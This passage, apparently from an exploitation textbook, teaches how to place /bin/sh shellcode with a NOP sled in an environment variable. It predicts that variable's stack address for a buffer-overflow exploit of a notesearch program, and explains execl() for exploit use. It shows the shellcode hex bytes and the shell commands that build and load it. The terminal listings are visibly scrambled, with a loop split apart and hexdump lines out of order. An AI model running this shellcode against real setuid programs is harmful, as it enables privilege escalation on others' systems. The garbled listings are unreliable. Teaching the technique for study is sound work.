Sometimes a buffer will be too small to hold even shellcode. Fortunately, there
are other locations in memory where shellcode can be stashed. Environment
variables are used by the user shell for a variety of things, but what they are
used for isn’t as important as the fact they are located on the stack and can
be set from the shell.


reader@hacking:~/booksrc
> do
> echo -en $i
> done > shellcode.bin
reader@hacking:~/booksrc
00000000 31 c0 31 db 31
00000010 2f 2f 73 68 68
00000020 e1 cd 80
00000023
reader@hacking:~/booksrc
$ for i in $(head exploit_notesearch.c | grep "^\"" | cut -d\" -f2)
$ hexdump -C shellcode.bin
c9 99 b0 a4 cd 80 6a 0b 58 51 68
2f 62 69 6e 89 e3 51 89 e2 53 89
|1.1.1......j.XQh|
|//shh/bin..Q..S.|
|...|


Now we have the shellcode in a file called shellcode.bin. This can be used
with command substitution to put shellcode into an environment variable,
along with a generous NOP sled.
reader@hacking:~/booksrc $ export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat shellcode.bin)
reader@hacking:~/booksrc $ echo $SHELLCODE
1 1 1
j
XQh//shh/bin
Q
S
reader@hacking:~/booksrc $




The environment variables are located near the bottom of the
stack, so this is where we should look when running notesearch in a debugger.


In order to be able to predict an exact memory address, the differences
in the addresses must be explored. The length of the name of the program
being executed seems to have an effect on the address of the environment
variables. This effect can be further explored by changing the name of the
program and experimenting. This type of experimentation and pattern
recognition is an important skill for a hacker to have.


reader@hacking:~/booksrc $ cp a.out a
reader@hacking:~/booksrc $ ./a SLEDLESS
SLEDLESS is at 0xbfffff4e
reader@hacking:~/booksrc $ cp a.out bb
reader@hacking:~/booksrc $ ./bb SLEDLESS
SLEDLESS is at 0xbfffff4c
reader@hacking:~/booksrc $ cp a.out ccc
reader@hacking:~/booksrc $ ./ccc SLEDLESS
SLEDLESS is at 0xbfffff4a
reader@hacking:~/booksrc $ ./a.out SLEDLESS
SLEDLESS is at 0xbfffff46
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xbfffff4e - 0xbfffff46
$1 = 8
(gdb) quit
reader@hacking:~/booksrc $




The important part of this function is shown in bold. The fork() function
starts a new process, and the execl() function is used to run the command
through /bin/sh with the appropriate command-line arguments.
The use of system() can sometimes cause problems. If a setuid program
uses system() , the privileges won’t be transferred, because /bin/sh has been
dropping privileges since version two. This isn’t the case with our exploit, but
the exploit doesn’t really need to be starting a new process, either. We can
ignore the fork() and just focus on the execl() function to run the command.
The execl() function belongs to a family of functions that execute com-
mands by replacing the current process with the new one. The arguments for
execl() start with the path to the target program and are followed by each of
the command-line arguments. The second function argument is actually the
zeroth command-line argument, which is the name of the program. The last
argument is a NULL to terminate the argument list, similar to how a null
byte terminates a string.
The execl() function has a sister function called execle() , which has one
additional argument to specify the environment under which the executing
process should run. This environment is presented in the form of an array of
pointers to null-terminated strings for each environment variable, and the
environment array itself is terminated with a NULL pointer
